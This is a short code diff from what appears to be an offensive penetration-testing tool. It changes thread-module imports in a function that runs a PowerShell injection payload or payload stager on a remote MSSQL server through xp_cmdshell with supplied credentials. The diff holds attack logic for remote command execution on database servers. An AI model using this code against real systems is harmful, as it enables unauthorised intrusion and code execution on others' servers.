@@ -334,7 +334,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
     try:
         reload(thread)
     except:
-        import _thread
+        import thread
 
     # execute the payload
     # we append more commands if option 1 is used
@@ -342,14 +342,14 @@ def deploy_hex2binary(ipaddr, port, username, password):
         print_status("Triggering the powershell injection payload... ")
         sql_command = ("exec master..xp_cmdshell '%s'" % (powershell_command))
         #mssql.sql_query("exec master..xp_cmdshell '%s'" % (powershell_command))
-        _thread.start_new_thread(mssql.sql_query, (sql_command,))
+        thread.start_new_thread(mssql.sql_query, (sql_command,))
 
     # using the old method
     if option == "2":
         print_status("Triggering payload stager...")
         sql_command = ("xp_cmdshell '%s'" % (random_exe))
         # start thread of SQL command that executes payload
-        _thread.start_new_thread(mssql.sql_query, (sql_command,))
+        thread.start_new_thread(mssql.sql_query, (sql_command,))
         time.sleep(1)
 
     # if pexpect doesnt exit right then it freaks out
